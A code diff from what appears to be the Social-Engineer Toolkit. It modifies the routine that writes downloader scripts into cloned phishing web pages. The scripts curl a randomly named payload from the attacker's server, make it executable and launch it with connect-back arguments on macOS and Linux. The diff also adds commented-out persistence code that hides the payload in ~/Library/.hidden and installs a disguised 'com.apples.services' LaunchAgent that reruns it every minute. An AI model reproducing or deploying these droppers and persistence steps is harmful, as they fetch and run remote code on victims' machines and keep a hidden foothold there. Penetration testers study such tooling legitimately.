@@ -1,9 +1,7 @@
 #!/usr/bin/python
 ############################################
-#
 # Code behind the SET interactive shell
 # and RATTE
-#
 ############################################
 import os
 import sys
@@ -168,17 +166,78 @@ if posix == True:
     payload_flags = webserver.split(" ")
     # grab osx binary name
     osx_name = generate_random_string(10,10)
-    downloader = "#!/bin/sh\ncurl -C - -O http://%s/%s\nchmod +x %s\n./%s %s %s &" % (payload_flags[1],osx_name,osx_name,osx_name,payload_flags[1],payload_flags[2])
-    filewrite.write(downloader)
+    downloader = "#!/bin/sh\ncurl -C -O http://%s/%s > /tmp/%s\nchmod +x /tmp/%s\n./tmp/%s %s %s &" % (payload_flags[1],osx_name,osx_name,osx_name,osx_name,payload_flags[1],payload_flags[2])
+    filewrite.write(downloader + "\n")
+    persistence = check_config("ENABLE_PERSISTENCE_OSX=").lower()
+    if persistence == "on":
+        print "Coming soon.."
+        # modified persistence osx from http://patrickmosca.com/root-a-mac-in-10-seconds-or-less/
+        #filewrite.write(r"mkdir ~/Library/.hidden")
+        #filewrite.write("\n")
+        #filewrite.write("cp /tmp/%s ~/Library/.hidden" % (osx_name))
+        #filewrite.write("\n")
+        #filewrite.write(r"echo '#!/bin/bash' > ~/Library/.hidden/connect.sh")
+        #filewrite.write("\n")
+        #filewrite.write("echo './%s %s %s &' >> ~/Library/.hidden/connect.sh" % (osx_name, payload_flags[1], payload_flags[2]))
+        #filewrite.write("\n")
+        #filewrite.write(r"echo 'chmod +x ~/Library/.hidden/connect.sh' >> ~/Library/.hidden/connect.sh")
+        #filewrite.write("\n")
+        #filewrite.write(r"mkdir ~/Library/LaunchAgents")
+        #filewrite.write("\n")
+        #filewrite.write("echo '<plist version=\"1.0\">' > ~/Library/LaunchAgents/com.apples.services.plist")
+        #filewrite.write("\n")
+        #filewrite.write(r"echo '<dict>' >> ~/Library/LaunchAgents/com.apples.services.plist")
+        #filewrite.write("\n")
+        #filewrite.write(r"echo '<key>Label</key>' >> ~/Library/LaunchAgents/com.apples.services.plist")
+        #filewrite.write("\n")
+        #filewrite.write(r"echo '<string>com.apples.services</string>' >> ~/Library/LaunchAgents/com.apples.services.plist")
+        #filewrite.write("\n")
+        #filewrite.write(r"echo '<key>ProgramArguments</key>' >> ~/Library/LaunchAgents/com.apples.services.plist")
+        #filewrite.write("\n")
+        #filewrite.write(r"echo '<array>' >> ~/Library/LaunchAgents/com.apples.services.plist")
+        #filewrite.write("\n")
+        #filewrite.write(r"echo '<string>/bin/sh</string>' >> ~/Library/LaunchAgents/com.apples.services.plist")
+        #filewrite.write("\n")
+        #filewrite.write("echo '<string>'$HOME'/Library/.hidden/connect.sh</string>' >> ~/Library/LaunchAgents/com.apples.services.plist")
+        #filewrite.write("\n")
+        #filewrite.write(r"echo '</array>' >> ~/Library/LaunchAgents/com.apples.services.plist")
+        #filewrite.write("\n")
+        #filewrite.write(r"echo '<key>RunAtLoad</key>' >> ~/Library/LaunchAgents/com.apples.services.plist")
+        #filewrite.write("\n")
+        #filewrite.write(r"echo '<true/>' >> ~/Library/LaunchAgents/com.apples.services.plist")
+        #filewrite.write("\n")
+        #filewrite.write(r"echo '<key>StartInterval</key>' >> ~/Library/LaunchAgents/com.apples.services.plist")
+        #filewrite.write("\n")
+        #filewrite.write(r"echo '<integer>60</integer>' >> ~/Library/LaunchAgents/com.apples.services.plist")
+        #filewrite.write("\n")
+        #filewrite.write(r"echo '<key>AbandonProcessGroup</key>' >> ~/Library/LaunchAgents/com.apples.services.plist")
+        #filewrite.write("\n")
+        #filewrite.write(r"echo '<true/>' >> ~/Library/LaunchAgents/com.apples.services.plist")
+        #filewrite.write("\n")
+        #filewrite.write(r"echo '</dict>' >> ~/Library/LaunchAgents/com.apples.services.plist")
+        #filewrite.write("\n")
+        #filewrite.write(r"echo '</plist>' >> ~/Library/LaunchAgents/com.apples.services.plist")
+        #filewrite.write("\n")
+        #filewrite.write(r"chmod 600 ~/Library/LaunchAgents/com.apples.services.plist")
+        #filewrite.write("\n")
+        #filewrite.write(r"launchctl load ~/Library/LaunchAgents/com.apples.services.plist")
+
     filewrite.close()
     # grab nix binary name
+    #linux_name = check_options("NIX.BIN=")
     linux_name = generate_random_string(10,10)
     downloader = "#!/usr/bin/sh\ncurl -C - -O http://%s/%s\nchmod +x %s\n./%s %s %s &" % (payload_flags[1],linux_name,linux_name,linux_name,payload_flags[1],payload_flags[2])
     filewrite = file(setdir + "/web_clone/nix.bin", "w")
     filewrite.write(downloader)
     filewrite.close()
-    shutil.copyfile("src/payloads/set_payloads/shell.osx", setdir + "/web_clone/%s" % (osx_name))
-    shutil.copyfile("src/payloads/set_payloads/shell.linux", setdir + "/web_clone/%s" % (linux_name))
+    shutil.copyfile(definepath + "/src/payloads/set_payloads/shell.osx", setdir + "/web_clone/%s" % (osx_name))
+    shutil.copyfile(definepath + "/src/payloads/set_payloads/shell.linux", setdir + "/web_clone/%s" % (linux_name))
+
+    # copy over the downloader scripts
+    osx_down = check_options("MAC.BIN=")
+    lin_down = check_options("NIX.BIN=")
+    shutil.copyfile(setdir + "/web_clone/nix.bin", setdir + "/web_clone/%s" % (lin_down))
+    shutil.copyfile(setdir + "/web_clone/mac.bin", setdir + "/web_clone/%s" % (osx_down))
 
 # check to see if we are using a staged approach or direct shell
 stager = check_config("SET_SHELL_STAGER=").lower()
